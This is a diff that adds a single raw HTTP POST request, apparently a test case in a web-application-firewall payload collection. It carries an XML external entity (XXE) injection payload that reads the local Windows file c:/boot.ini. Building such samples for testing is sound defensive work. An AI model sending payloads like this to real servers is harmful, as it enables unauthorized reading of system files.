@@ -1,0 +1,8 @@
+#[XML外部实体注入(XXE)]读取本地文件boot.ini#1
+POST / HTTP/1.1
+Host: www.swaf.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
+Content-Type: application/xml
+Content-Length: 146
+
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [    <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
